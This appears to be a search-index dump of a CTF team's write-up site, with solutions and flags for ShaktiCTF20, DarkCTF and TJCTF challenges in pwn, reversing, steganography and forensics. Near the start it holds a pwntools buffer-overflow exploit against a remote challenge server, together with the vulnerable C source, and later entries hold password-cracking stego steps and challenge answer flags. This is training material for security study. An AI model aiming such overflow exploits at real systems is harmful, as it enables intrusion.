can see that calling win() would help us read the flag.txt file, this is supposed to be our final destination. So exploit the overflow to overwrite the return address and run away with the flag!","title":"Solution"},{"location":"ShaktiCTF20/pwning/returning/#exploit","text":"from pwn import * #p = process( ./chall ) p = remote( 34.72.218.129 ,2222) p.sendline( y ) p.sendline( a *19) p.sendline( y ) p.sendline( b *19) p.sendline( n ) #gdb.attach(p) payload = 'a'*24 + p64(0x400921) p.sendline(payload) p.interactive()","title":"Exploit"},{"location":"ShaktiCTF20/pwning/returning/#source-code","text":"#include stdio.h #include stdlib.h #include unistd.h #include string.h int count=0, pos=0; char buffer1[20]; char ch[2]; void initialize() { setvbuf(stdin,0,2,0); setvbuf(stdout,0,2,0); setvbuf(stderr,0,2,0); alarm(30); } void win() { char flag[50]; FILE *ptr; ptr = fopen( flag.txt , r ); if(ptr == NULL) { printf( Error! ); exit(1); } fgets(flag,50, (FILE*)ptr); printf( %s\\n ,flag); exit(0); } void main() { char buffer[8]; initialize(); puts( \\nWelcome! A lonely mute program is all I am... ); puts( \\nWould you like to talk to me? (y/n) ); scanf( %c , ch[1]); while(ch[1]=='y' count 2) { puts( Say something... ); getchar(); read(0,buffer1,20); pos += snprintf(buffer,1, %s ,buffer1); puts( \\nWould you like to continue talking to me? (y/n) ); scanf( %c , ch[1]); count+=1; } printf( %d Any bidding words?\\n ,pos); getchar(); read(0,buffer,pos); return; }","title":"Source Code"},{"location":"ShaktiCTF20/reversing/EZ/","text":"EZ Challenge discription Lets try a beginners windows challenge!!! Author :bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS By using IDA decompilor in windows , you can get the peudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag! The solution script: #include stdio.h #include string.h /* give the input as lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv Shown in the challenge file and get the input to be used.*/ char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i 6 i =16){ input[i]=input[i]--; } if(i =0 i 4){ input[i]=input[i]++; } if(i =4 i =6){ input[i]=input[i]+3; } if(i 30 i 16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf( %s\\n ,input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf( Enter passcode : \\n ); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf( Input should be :%s\\n ,output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"EZ"},{"location":"ShaktiCTF20/reversing/EZ/#ez","text":"Challenge discription Lets try a beginners windows challenge!!! Author :bl4ck_Widw Writeup: The file provided is a executable file , that can be reversed in windows OS By using IDA decompilor in windows , you can get the peudocode of the challenge. Using that it will be very easy to reverse the program. All you have to do is reverse the functions and use the given string to find the input which will be the key. If the key you gave in is correct , use that key as the passcode in the executable ,to obtain the flag! The solution script: #include stdio.h #include string.h /* give the input as lcZdl_Yoati+Xjn,lN!gGRdNR-R]H`=XjN,lo*+Iv Shown in the challenge file and get the input to be used.*/ char* lol(char *input){ int i; for(i=0;input[i]!='\\0';i++){ if(i 6 i =16){ input[i]=input[i]--; } if(i =0 i 4){ input[i]=input[i]++; } if(i =4 i =6){ input[i]=input[i]+3; } if(i 30 i 16){ input[i]=input[i]^4; } else input[i]=input[i]-5; } printf( %s\\n ,input); return input; } char* solo(char *soul){ int l; for(l=0;soul[l]!='\\0';l++){ soul[l]=((soul[l]+5)^1); } return soul; } int main(){ char input[100],ch; char output[100]; printf( Enter passcode : \\n ); fgets(input,42,stdin); strcpy(output,solo(lol(input))); printf( Input should be :%s\\n ,output ); } Flag :shaktictf{n0_qu3sT1oN_iS_4_dUmB_qU3st10N}","title":"EZ"},{"location":"ShaktiCTF20/reversing/PYthn/","text":"PYthn Challenge description Familiar with python? Author : bl4ck_Widw Writeup The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q= K78m)hm=|cwsXhbH}uq5w4sJbPrw6 def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i 11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input( Enter input: ) k=FuN(Fun(X)) if(Q!=k): print( NO ) else: print( Flag: shaktictf{ +X+ } ) Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q= K78m)hm=|cwsXhbH}uq5w4sJbPrw6 def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i 11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print( shaktictf{ +k+ } ) flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#pythn","text":"","title":"PYthn"},{"location":"ShaktiCTF20/reversing/PYthn/#challenge-description","text":"Familiar with python? Author : bl4ck_Widw","title":"Challenge description"},{"location":"ShaktiCTF20/reversing/PYthn/#writeup","text":"The challenge is really basic and simple for people who are familiar with python programing. The program need to be reversed to get the flag . The source code: Z=[] k=[] Q= K78m)hm=|cwsXhbH}uq5w4sJbPrw6 def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i 11): Z.append(chr(ord(inp[i])+i+5)) else: Z.append(chr(ord(inp[i])+4)) return(''.join(Z)) def fuN(text,s): result = for i in range(len(text)): char = text[i] if(char.isnumeric()): result+=(chr(ord(char)-1)) elif(char.isupper()): result += chr((ord(char) + s-65) % 26 + 65) else: result+=(chr(ord(char)^1)) return result X=input( Enter input: ) k=FuN(Fun(X)) if(Q!=k): print( NO ) else: print( Flag: shaktictf{ +X+ } ) Here the variable k , is getting a string returned from two functions - FuN() and Fun(). (Note that function fuN is never used ) The input is simply passed on to the two functions and and the ouptput 'k' is compared with the string 'K78m)hm=|cwsXhbH}uq5w4sJbPrw6'. All we have to do is , find the input from this by reversing the functions to get the flag . Solution script: y=[] Z=[] k=[] Q= K78m)hm=|cwsXhbH}uq5w4sJbPrw6 def Fun(inp): st=[] for i in range (len(inp)): st.append(chr(ord(inp[i])^1)) return(''.join(st)) def FuN(inp): for i in range(len(inp)): if(i 11): Z.append(chr(ord(inp[i])-5-i)) else: Z.append(chr(ord(inp[i])-4)) return(''.join(Z)) k=Fun(FuN(Q)) print( shaktictf{ +k+ } ) flag : shaktictf{G00d!_c0nTinUe_Expl0r1nG_Mor3}","title":"Writeup"},{"location":"ShaktiCTF20/reversing/assemble/","text":"Assemble! Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13 Challenge Description Your input is your flag. Flag format: shaktictf{input1,input2,input3} Solution We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N Flag shaktictf{1867964258,1867964301,305419896}","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#assemble","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 13","title":"Assemble!"},{"location":"ShaktiCTF20/reversing/assemble/#challenge-description","text":"Your input is your flag. Flag format: shaktictf{input1,input2,input3}","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/assemble/#solution","text":"We have to input three numbers which pass a series of conditions which on the end should give us Correct as an output. So here, ebx contains our 2nd input and DWORD[ebp-0x4] is our first input. And their sum should be equal to 0xdeadbeef. mov ebx, DWORD[ebp-0xc] add ebx, DWORD[ebp-0x4] cmp ebx,0xdeadbeef jne N Then we put a condition on our first input and second input. Our first input should be less than 0x6f56df65. And our second input should be 0x6f56df8d. So we find that our first input becomes 0x6f56df62(keeping in mind the above condition). cmp DWORD[ebp-0x4], 0x6f56df65 jg N cmp DWORD[ebp-0xc], 0x6f56df8d jg N cmp DWORD[ebp-0xc], 0x6f56df8d jl N Onto finding our third input, we see that our second input is being xored with our third input. We already know our second input so our third input is 1867964301 ^ 2103609845 which is 305419896 mov ecx, DWORD[ebp-0x14] mov ebx, DWORD[ebp-0xc] xor ecx, ebx cmp ecx, 2103609845 jne N","title":"Solution"},{"location":"ShaktiCTF20/reversing/assemble/#flag","text":"shaktictf{1867964258,1867964301,305419896}","title":"Flag"},{"location":"ShaktiCTF20/reversing/intro/","text":"Reversing Challenge Name Level Author Concept Assemble! Easy imm0rt4l_5t4rk assembly REach The Moon Medium imm0rt4l_5t4rk z3 EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing","title":"Reversing"},{"location":"ShaktiCTF20/reversing/intro/#reversing","text":"Challenge Name Level Author Concept Assemble! Easy imm0rt4l_5t4rk assembly REach The Moon Medium imm0rt4l_5t4rk z3 EZ Easy bl4ck_Widw windows PYthn Easy bl4ck_Widw python reversing","title":"Reversing"},{"location":"ShaktiCTF20/reversing/reach_the_moon/","text":"REach The Moon Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6 Challenge Description Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind. Solution In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec( a1[0] , 16), BitVec( a1[1] , 16), BitVec( a1[2] , 16), BitVec( a1[3] , 16), BitVec( a1[4] , 16), BitVec( a1[5] , 16), BitVec( a1[6] , 16), BitVec( a1[7] , 16), BitVec( a1[8] , 16), BitVec( a1[9] , 16), BitVec( a1[10] , 16), BitVec( a1[11] , 16), BitVec( a1[12] , 16), BitVec( a1[13] , 16), BitVec( a1[14] , 16), BitVec( a1[15] , 16), BitVec( a1[16] , 16) ] a2 = [ BitVec( a2[0] , 16), BitVec( a2[1] , 16), BitVec( a2[2] , 16), BitVec( a2[3] , 16), BitVec( a2[4] , 16), BitVec( a2[5] , 16), BitVec( a2[6] , 16), BitVec( a2[7] , 16), BitVec( a2[8] , 16), BitVec( a2[9] , 16), BitVec( a2[10] , 16), BitVec( a2[11] , 16), BitVec( a2[12] , 16), BitVec( a2[13] , 16), BitVec( a2[14] , 16), BitVec( a2[15] , 16), BitVec( a2[16] , 16) ] check = shaktictf{0Fl4gY3t?} ; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i] 40, a1[i] 127) s.add(a2[i] 40, a2[i] 127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?} Flag shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#reach-the-moon","text":"Challenge author imm0rt4l_5t4rk Challenge points: 200 Challenge solves: 6","title":"REach The Moon"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#challenge-description","text":"Enter the correct flag to reach the moon. Your input will include shaktictf{} in it. Keep that in mind.","title":"Challenge Description"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#solution","text":"In the challenge the program asks us to input two strings eac of which is of length 17. Using the two strings various operations are conducted using them and the result is stored in a check array. The check array is being compared to a string of length 20 which is shaktictf{N0FL4GY3t?} . If it passes the comparison it gives us the flag(which was our input itself). Otherwise if it fails it returns Not there yett. To solve such a challenge where we have to find a probable answer consisting of many equations and conditions that are not solvable by hand or are time taking we generally use python tools such as z3-solver or angr. Below is a z3 script to get one definite solution based on the conditions given in the challenge. from z3 import * a1 = [ BitVec( a1[0] , 16), BitVec( a1[1] , 16), BitVec( a1[2] , 16), BitVec( a1[3] , 16), BitVec( a1[4] , 16), BitVec( a1[5] , 16), BitVec( a1[6] , 16), BitVec( a1[7] , 16), BitVec( a1[8] , 16), BitVec( a1[9] , 16), BitVec( a1[10] , 16), BitVec( a1[11] , 16), BitVec( a1[12] , 16), BitVec( a1[13] , 16), BitVec( a1[14] , 16), BitVec( a1[15] , 16), BitVec( a1[16] , 16) ] a2 = [ BitVec( a2[0] , 16), BitVec( a2[1] , 16), BitVec( a2[2] , 16), BitVec( a2[3] , 16), BitVec( a2[4] , 16), BitVec( a2[5] , 16), BitVec( a2[6] , 16), BitVec( a2[7] , 16), BitVec( a2[8] , 16), BitVec( a2[9] , 16), BitVec( a2[10] , 16), BitVec( a2[11] , 16), BitVec( a2[12] , 16), BitVec( a2[13] , 16), BitVec( a2[14] , 16), BitVec( a2[15] , 16), BitVec( a2[16] , 16) ] check = shaktictf{0Fl4gY3t?} ; c = [] for i in range(len(check)): c.append(ord(check[i])) s = Solver() for i in range(17): s.add(a1[i] 40, a1[i] 127) s.add(a2[i] 40, a2[i] 127) s.add(c[0] == a1[0]) #We have hardcoded the starting characters to be 'shaktictf{' and last character to be '}' because it says in the s.add(c[1] == a1[1]) #description that the input will have the flag format in it. s.add(c[2] == a1[2]) s.add(c[3] == a1[3]) s.add(c[4] == a1[4]) s.add(c[5] == a1[5]) s.add(c[6] == a1[6]) s.add(c[7] == a1[7]) s.add(c[8] == a1[8]) s.add(c[9] == a1[9]) s.add(c[19] == a2[16]) print(s.check()) s.add(c[0] == (a1[0] - 71) ^ a2[0]) s.add(c[1] == LShR(a1[1],2) + (a2[1] - 0x7)) print(s.check()) s.add(c[2] == (3 * (a2[2] - (a1[2] ^ 0x2d))) - 0x14) s.add(c[3] == (2 * (a1[3] - a2[3])) ^ 0x1b) s.add(c[4] == (a1[4] + a2[4]) ^ 0xa7) s.add(c[5] == a1[5] (a2[5] + 0x6f)) s.add(c[6] == (a1[6] % a2[6]) + 0x33) s.add(c[7] == (a1[7] ^ 0x61) + a2[7]) s.add(c[8] == (~a1[8] + 0xbd) ^ a2[8]) s.add(c[9] == (a2[9] ^ 0x30) + (a1[9] ^ 0x42)) s.add(c[19] == (LShR(a1[16], 0x2) + (a2[16] ^ 0x1d))) s.add(a2[0] == a2[10]) s.add(c[10] == LShR(a2[11], a1[11] / 0x1f)) s.add(c[11] == (a2[3] - a1[11]) * 0x23) s.add(c[12] == a2[12] ^ a1[12] ^ 0x46) s.add(c[13] == (~a2[13] % 0x100) - a1[12]) s.add(c[14] == a2[13]) s.add(c[15] == LShR(a2[14],0xc1) - (~a1[13] ^ 0x7)) s.add(c[16] == (a1[14] % 0x7a) + (a2[14] % 0x73) - 0xb8) s.add(c[17] == (a2[14] % 0x73) + (~a1[15] + 0x33)) s.add(c[18] == a1[16] % 118 a2[15] ^ 10) l = ((a2[0] ^ 4) ^ 31) s.add(a1[10] == l) s.add(a1[10] == a2[15] + 5) s.add(a2[15] == 63) print(s.check()) #print(s.model()) m = s.model() w = '' x = '' for i in range(17): w += chr(m[a1[i]].as_long()) x += chr(m[a2[i]].as_long()) print(w) print(x) Thus our two inputs become shaktictf{D1d_y0u and _Us3_z3_0r_aNgr?}","title":"Solution"},{"location":"ShaktiCTF20/reversing/reach_the_moon/#flag","text":"shaktictf{D1d_y0u_Us3_z3_0r_aNgr?}","title":"Flag"},{"location":"ShaktiCTF20/stego/hidd3n/","text":"Hidd3n Challenge Description Seems like there is something hidden in this image. Can you find it out? Short writeup The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag. Challenge Author v1Ru5 Flag shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#hidd3n","text":"","title":"Hidd3n"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-description","text":"Seems like there is something hidden in this image. Can you find it out?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/hidd3n/#short-writeup","text":"The string given in the Comment section of exiftool is base64 encoded. Decode it and we get a passphrase. Use steghide and enter the passphrase to view the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/hidd3n/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/hidd3n/#flag","text":"shaktictf{G00d!_b3st_0f_luck_f0r_th3_n3xt_chall3nge}","title":"Flag"},{"location":"ShaktiCTF20/stego/intro/","text":"Steganography Challenge Name Level Author Concept Secret Medium v1Ru5 audacity Hidd3n Easy v1Ru5 exiftool,steghide Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/intro/#steganography","text":"Challenge Name Level Author Concept Secret Medium v1Ru5 audacity Hidd3n Easy v1Ru5 exiftool,steghide Invisible Very Easy v1Ru5 stegsnow,morse Just Crack It Easy v1Ru5 steghide,stegcracker Pretty Good Medium v1Ru5 pgp decryption","title":"Steganography"},{"location":"ShaktiCTF20/stego/invisible/","text":"Invisible Stego Author : v1Ru5 Challenge Description One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING} Short writeup: The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#invisible","text":"","title":"Invisible"},{"location":"ShaktiCTF20/stego/invisible/#stego","text":"Author : v1Ru5","title":"Stego"},{"location":"ShaktiCTF20/stego/invisible/#challenge-description","text":"One of our engineer got some clues regarding a recent attack in the city, using her knowledge on networking. Can you connect the dots and help us? Flag Format : shaktictf{STRING}","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/invisible/#short-writeup","text":"The image file is a rabbit hole. Perform stegsnow on the text file and decode the morse to get the flag. flag : shaktictf{AM1V1SIBL3N0W}","title":"Short writeup:"},{"location":"ShaktiCTF20/stego/just_crack_it/","text":"Just Crack It Challenge Description One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us? Short writeup Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag. Challenge Author v1Ru5 Flag shaktictf{y0u_M4d3_iT_85284501}","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#just-crack-it","text":"","title":"Just Crack It"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-description","text":"One of our Network Security Analyst intercepted the communication between some spies from other country and concluded that they used two images to transmit the message. Can you help us?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/just_crack_it/#short-writeup","text":"Perform 'stegcracker hacker.jpg ' and use that password (14ms0c00l!) while performing 'steghide extract -sf laptop.jpg' to get the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/just_crack_it/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/just_crack_it/#flag","text":"shaktictf{y0u_M4d3_iT_85284501}","title":"Flag"},{"location":"ShaktiCTF20/stego/pretty_good/","text":"Pretty Good Challenge Description Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message? Short writeup Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag. Challenge Author v1Ru5 Flag skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#pretty-good","text":"","title":"Pretty Good"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-description","text":"Ever since she got to know about this privacy technique, she believed that this was the best encryption method. Can you prove her wrong by finding out the message?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/pretty_good/#short-writeup","text":"Perform zbarimg on the qrcode to get the private key and and jsteg and strings on the second image to get the message and passphrase. Use any pgp decryption tool and decode the obtained ROT13 message to see the flag.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/pretty_good/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/pretty_good/#flag","text":"skaktictf{jU5t_dr1nk_m0r3_c0ff33}","title":"Flag"},{"location":"ShaktiCTF20/stego/secret/","text":"Secret Challenge Description An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information? Short writeup Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully. Challenge Author v1Ru5 Flag shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#secret","text":"","title":"Secret"},{"location":"ShaktiCTF20/stego/secret/#challenge-description","text":"An American computer network engineer tried to convey something about a breach that happened recently, but we couldn't understand anything. We have a recording of her conversation with us. Can you help us in retrieving the information?","title":"Challenge Description"},{"location":"ShaktiCTF20/stego/secret/#short-writeup","text":"Open the file in hex editor and change the file header. Open the file using Audacity and reverse the audio. Change the speed and listen carefully.","title":"Short writeup"},{"location":"ShaktiCTF20/stego/secret/#challenge-author","text":"v1Ru5","title":"Challenge Author"},{"location":"ShaktiCTF20/stego/secret/#flag","text":"shaktictf{th15_w45_4n_e4sy_ch4lleng3}","title":"Flag"},{"location":"crypto/intro/","text":"Cryptography Introduction \"Write about Crypto and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Cryptography"},{"location":"crypto/intro/#cryptography","text":"","title":"Cryptography"},{"location":"crypto/intro/#introduction","text":"\"Write about Crypto and about the writeups\"","title":"Introduction"},{"location":"crypto/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/intro/","text":"Forensics Introduction \"Write about Forensics and about the writeups\" The contents of this repo This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"Forensics"},{"location":"forensics/intro/#forensics","text":"","title":"Forensics"},{"location":"forensics/intro/#introduction","text":"\"Write about Forensics and about the writeups\"","title":"Introduction"},{"location":"forensics/intro/#the-contents-of-this-repo","text":"This repo contains the writeups of varoius challenges from CTFs we have attempted.","title":"The contents of this repo"},{"location":"forensics/DarkCTF/Knot-65/Knot/","text":"Knot-65 Description Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password. Solution So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open( file.txt , r ) r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#knot-65","text":"","title":"Knot-65"},{"location":"forensics/DarkCTF/Knot-65/Knot/#description","text":"Mr Elliot Anderson has received a zip file from somewhere around. From a secret friend he got a transcript of some conversation. Help Mr. Elliot to get the secret flag. Once you get the password,convert it to lower case as password.","title":"Description"},{"location":"forensics/DarkCTF/Knot-65/Knot/#solution","text":"So, we are given one password protected zip file and one text file. If you look carefully we can find that some of the characters in the text file are in uppercase. You can either write a python program or manually collect the uppercase letters. And we get IKNOWYARECOLLECTAINGLLUPPERCASELETTERFIRSTPARTOFTHEPASSWORDISLETTHEREBE r = open( file.txt , r ) r = r.read() part1='' for i in r: if i.isupper(): part1+=i print(part1) As mentioned in the description, after converting it to lowercase, we get iknowyarecollectainglluppercaseletterfirstpartofthepasswordislettherebe. And the first part of the flag is lettherebe. We get the second part of the flag by running stegsnow. The second part of the flag is goodrainswithshining. We find some homoglyph unicode characters towards the end of the text file. Collecting those characters we get the last part of the flag rainnnbow. So, the final password is \"lettherebegoodrainswithshiningrainnnbow\". We use this password to open the password protected text file which contains some 8 digit numbers. 31060562 32641524 21475550 14066460 21666171 34073461 35044157 33661564 15046170 23032164 146764 This is octal-xlate encoding. We can decode these characters online from here And the flag is darkCTF{h0m0Glypw1tHooct4LxL4t3}","title":"Solution"},{"location":"forensics/DarkCTF/Powershell/Powershell/","text":"PowerShell Solved by : Sridevi Description I want to know what is happening in my Windows Powershell. Solution We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#powershell","text":"Solved by : Sridevi","title":"PowerShell"},{"location":"forensics/DarkCTF/Powershell/Powershell/#description","text":"I want to know what is happening in my Windows Powershell.","title":"Description"},{"location":"forensics/DarkCTF/Powershell/Powershell/#solution","text":"We are given a .mp3 file. When we open the file, we get an error. So, let's use binwalk to extract the embedded files. Since the challenge name is PowerShell, let's see what is there in PowerShell.xml There is a base64 string. Let's see what we get after decoding it. Flag: darkCTF{C0mm4nd_0n_p0w3rsh3ll}","title":"Solution"},{"location":"forensics/TJCTF/Rap God/Rap/","text":"Rap Goad Solved by : Sridevi Description My rapper friend Big Y sent me his latest track but something sounded a little off about it. Help me find out if he was trying to tell me something with it. Submit your answer as tjctf{message} Solution Open the given mp3 file using Sonic Visualiser. Using Spectrogram we see something like this. They are encoded images, but not clear. Let's examine the channel-2 in Spectrogram. Now, the encoded symbols are clear. After surfing through internet I came across this website which decodes similar images as in our case. Let's try decoding using this website. tjctf{quicksonic} We got the flag!","title":"Rap Goad"},{"location":"forensics/TJCTF/Rap God/Rap/#rap-goad","text":"Solved by : Sridevi","title":"Rap 